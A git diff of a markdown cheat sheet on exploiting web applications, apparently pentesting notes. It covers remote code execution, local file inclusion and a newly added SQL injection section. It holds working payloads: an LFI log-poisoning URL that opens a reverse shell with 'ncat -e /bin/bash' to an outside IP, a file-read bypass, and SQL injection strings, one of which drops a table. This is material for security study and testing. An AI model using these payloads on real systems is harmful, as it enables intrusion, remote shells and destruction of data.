@@ -1,6 +1,6 @@
 <!-- # exploiting_web_application -->
 # Server side EXploitation
-## Remote code execution (RCE)
+## 1. Remote code execution (RCE)
   * Example of Code Evaluation Exploitation
   You want to have dynamically generated variable names for every user and store its registration date. This is how it could be done in PHP:
   
@@ -78,7 +78,7 @@ attacker
   bypass  in url... It reads every thing that starts with fl in the direcory
      
         `nl /etc/fl*`
-## LOcal File Inclusion vulnerability (LFI)
+## 2. LOcal File Inclusion vulnerability (LFI)
   * A Local File Inclusion attack is used to trick the application into exposing or running files on the server.
       
       Example vulnerable code 
@@ -101,8 +101,43 @@ attacker
    
           ?file=/var/log/auth.log&c=ls -la
           ?file=/var/log/auth.log&c=ncat -e /bin/bash 192.168.1.2 1234
-          
+  ## 3. SQL Injection
+    
+   Testing
+      
+       ' or 1=1;--
+       " or 1=1;--
+       ' or 1=1; drop table notes; —
+       'John' or 'x'='x' AND Password = 'Smith’ or ‘x’=’x’;
+       
+  For Example, if you get an error message like ‘Internal Server Error‘ as a search result, then we can be sure that this attack is possible in that part of the system.
+
+     Other results that may notify a possible attack include:
+     Blank page loaded.
+     No error or success messages – functionality and page do not react to the input.
+     Success message for malicious code
+  
+  Vulnerable Parts of this Attack
+Before starting the testing process, every sincere tester should more or less know which parts would be most vulnerable to this attack.
+
+It is also a good practice to plan which field of the system is to be tested exactly and in what order. In my testing career, I have learned that it is not a good idea to test fields against SQL attacks randomly as some fields can be missed.
+
+As this attack is being performed in the database, all data entry system parts, input fields, and website links are vulnerable.
+
+Vulnerable parts include:
+
+     Login fields
+     Search fields
+     Comment fields
+     Any other data entry and saving fields
+     Website links
+It is important to note that while testing against this attack, it is not enough to check only one or a few fields. It is quite common, that one field may be protected against SQL Injection, but then another does not. Therefore it is important not to forget to test all the website’s field
+     
+  ==================================================== <br>
+
 # Client side Exploitation
+  ==================================================== <br>
+
 ## Cross site scripting (XSS)
 ## XSS(Reflected)
 ### Basic XSS
